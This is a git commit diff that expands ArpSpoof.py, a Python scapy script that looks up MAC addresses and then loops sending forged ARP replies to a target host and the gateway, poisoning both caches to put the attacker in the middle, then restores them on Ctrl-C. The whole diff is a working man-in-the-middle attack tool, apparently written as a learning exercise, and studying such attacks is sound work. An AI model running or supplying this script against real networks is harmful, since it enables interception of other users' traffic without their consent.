6c0c9f60c1242d19600a6b7946cb87c15bb44289
Dust A <cragyn@gmail.com>
2019-04-18 20:13:10 -0400

    added features in arpspoof

--- ArpSpoof.py
+++ ArpSpoof.py
@@ -1,11 +1,49 @@
 import scapy.all as scapy
 import argparse
+import time
 
 parser = argparse.ArgumentParser()
-parser.parse_args("-i", dest="tar_ip", help="enter the target  ip")
-parser.parse_args("-m", dest="tar_mac", help="enter the target mac")
+parser.add_argument("-ip", dest="ip", help="Please enter the IP you wish to scan for,"
+                                           " or the range of IPs")
+parser.add_argument("-g", dest="gateway", help="gateway")
 args = parser.parse_args()
 
 
-packet = scapy.ARP(op=2, pdst=args.tar_ip, hwdst=args.tar_mac, psrc="10.0.2.1")
-scapy.send(packet)
+# Basic scan which is not hidden, will ping every computer.
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_req_brd = broadcast/arp_request
+    ans = scapy.srp(arp_req_brd, timeout=1, verbose=False)[0]
+    return ans[0][1].hwsrc
+
+
+target_mac = get_mac(args.ip)
+
+
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+def restore(dest_ip, source_ip):
+    dest_mac = get_mac(dest_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+packet_count = 0
+try:
+    while True:
+        packet_count += 2
+        spoof(args.ip, args.gateway)
+        spoof(args.gateway, args.ip)
+        print("\r[+] Packets sent: " + str(packet_count), end="")
+        # sys.stdout.flush() not needed in py 3
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("Ctrl-C has been pressed, cancelled script")
+    restore(args.ip, args.gateway)
+    restore(args.gateway, args.ip)
